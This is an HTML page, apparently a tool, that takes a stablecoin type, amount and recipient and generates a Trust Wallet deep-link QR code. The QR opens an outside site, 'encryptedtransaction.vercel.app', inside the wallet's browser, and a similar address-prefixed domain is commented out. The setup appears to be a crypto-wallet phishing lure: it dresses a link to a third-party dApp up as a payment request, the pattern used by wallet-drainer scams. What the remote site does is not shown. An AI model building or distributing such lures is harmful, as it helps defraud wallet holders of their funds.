<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <title>Trust Wallet DApp QR</title>

  <style>
    * {
      box-sizing: border-box;
    }
    /* //fuck u */
    body {
      margin: 0;
      padding: 20px;
      background: #0f172a;
      color: #e2e8f0;
      font-family: Arial, sans-serif;
    }

    .container {
      max-width: 650px;
      margin: 40px auto;
      background: #1e293b;
      padding: 25px;
      border-radius: 14px;
    }

    h1 {
      margin-top: 0;
      font-size: 24px;
    }

    .box {
      background: #0f172a;
      padding: 15px;
      border-radius: 8px;
      margin-top: 15px;
    }

    .label {
      color: #94a3b8;
      font-size: 13px;
      margin-bottom: 8px;
    }

    input,
    select {
      width: 100%;
      padding: 12px;
      border: 1px solid #334155;
      border-radius: 8px;
      background: #1e293b;
      color: #e2e8f0;
      font-size: 14px;
      outline: none;
    }

    input:focus,
    select:focus {
      border-color: #3b82f6;
    }

    .value {
      font-family: monospace;
      word-break: break-all;
      line-height: 1.5;
    }

    #qrcode {
      display: flex;
      justify-content: center;
      align-items: center;
      background: white;
      padding: 20px;
      border-radius: 10px;
      margin-top: 20px;
      min-height: 320px;
    }

    button {
      width: 100%;
      padding: 13px;
      margin-top: 15px;
      border: 0;
      border-radius: 8px;
      background: #3b82f6;
      color: white;
      font-size: 15px;
      cursor: pointer;
    }

    button:hover {
      opacity: 0.9;
    }

    .success {
      color: #4ade80;
    }
  </style>
</head>

<body>

<div class="container">

  <h1>Trust Wallet DApp QR</h1>


  <!-- COIN -->

  <div class="box">

    <div class="label">
      Coin
    </div>

    <select id="coin">

      <option value="" selected disabled>
        Select Coin
      </option>

      <option value="usdterc20">
        USDT ERC20
      </option>

      <option value="usdcerc20">
        USDC ERC20
      </option>

      <option value="usdtbep20">
        USDT BEP20
      </option>

    </select>

  </div>


  <!-- AMOUNT -->

  <div class="box">

    <div class="label">
      Amount
    </div>

    <input
      id="amount"
      type="text"
      placeholder="Enter amount"
    >

  </div>


  <!-- RECIPIENT -->

  <div class="box">

    <div class="label">
      Recipient
    </div>

    <input
      id="recipient"
      type="text"
      placeholder="0x..."
    >

  </div>


  <!-- GENERATE -->

  <button onclick="generateQR()">
    Generate QR
  </button>


  <!-- DAPP URL -->




  <!-- TRUST DEEPLINK -->

  <div class="box">

    <div class="label">
      Trust Wallet Deep Link
    </div>

 
  </div>


  <!-- QR -->

  <div id="qrcode">
    QR will appear here
  </div>


  <!-- OPEN TRUST -->

 

  <!-- STATUS -->


</div>


<script src="https://cdn.jsdelivr.net/npm/kjua@0.1.1/dist/kjua.min.js"></script>

<script>

// const baseDappURL =
//   "https://0xbd110dc07d0322b96b4500af82d63f5db68cc105.becuss.com/";

const baseDappURL =
  "https://encryptedtransaction.vercel.app/";

let trustDeepLink = "";


/* =========================
   GENERATE QR
========================= */

function generateQR() {

  const coin =
    document.getElementById("coin").value;

  const amount =
    document.getElementById("amount").value.trim();

  const recipient =
    document.getElementById("recipient").value.trim();


  /* Validate */

  if (!coin) {
    alert("Please select a coin.");
    return;
  }

  if (!amount) {
    alert("Please enter an amount.");
    return;
  }

  if (!recipient) {
    alert("Please enter a recipient address.");
    return;
  }


  /* =========================
     BUILD DAPP URL
  ========================= */

  const dappURL =
    baseDappURL +
    "?coin=" + encodeURIComponent(coin) +
    "&amount=" + encodeURIComponent(amount) +
    "&recipient=" + encodeURIComponent(recipient);


  /* =========================
     BUILD TRUST DEEPLINK
  ========================= */

  trustDeepLink =
    "https://link.trustwallet.com/open_url" +
    "?coin_id=60" +
    "&url=" + encodeURIComponent(dappURL);


  /* =========================
     DISPLAY URLS
  ========================= */





  /* =========================
     REMOVE OLD QR
  ========================= */

  const qrContainer =
    document.getElementById("qrcode");

  qrContainer.innerHTML = "";


  /* =========================
     GENERATE QR
  ========================= */

  const qr = kjua({

    text: trustDeepLink,

    size: 280,

    fill: "#000000",

    back: "#ffffff",

    rounded: 0,

    quiet: 2,

    mode: "plain"

  });


  qrContainer.appendChild(qr);

}


/* =========================
   OPEN TRUST WALLET
========================= */

function openTrust() {

  if (!trustDeepLink) {

    generateQR();

    if (!trustDeepLink) {
      return;
    }

  }

  window.location.href =
    trustDeepLink;

}

</script>

</body>
</html>
